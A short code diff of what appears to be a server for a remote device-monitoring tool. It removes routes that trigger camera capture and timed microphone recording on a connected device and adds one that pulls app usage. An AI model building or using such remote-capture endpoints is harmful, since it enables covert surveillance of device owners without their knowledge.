@@ -117,35 +117,15 @@ app.get('/installed-apps/:id', async (req, res)=>{
   }
 });
 
-app.get('/camera/:id/:cam', async (req, res)=>{
+app.get('/usage/:id', async (req, res)=>{
   const id = req.params.id;
-  const cam = req.params.cam;
   const socketId = idToSocket.get(id);
-  io.to(socketId).emit('camera', cam);
+  io.to(socketId).emit('usage', "get installed apps");
   try{
   const appData = await new Promise((resolve, reject) => {
       if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
-      idToConnectionSocket.get(id).once("camera", (data) => {
-        resolve({"image":data});
-      });
-    });
-    
-    res.json(appData);
-  }catch(e){
-      res.json(e);
-  }
-});
-
-app.get('/record/:id/:time', async (req, res)=>{
-  const id = req.params.id;
-  const time = req.params.time;
-  const socketId = idToSocket.get(id);
-  io.to(socketId).emit('mic', time);
-  try{
-  const appData = await new Promise((resolve, reject) => {
-      if(!idToConnectionSocket.has(id)) reject({"error":"No connection socket"});
-      idToConnectionSocket.get(id).once("mic", (data) => {
-        resolve({"mic":data});
+      idToConnectionSocket.get(id).once("usage", (data) => {
+        resolve({"usage":data});
       });
     });
     
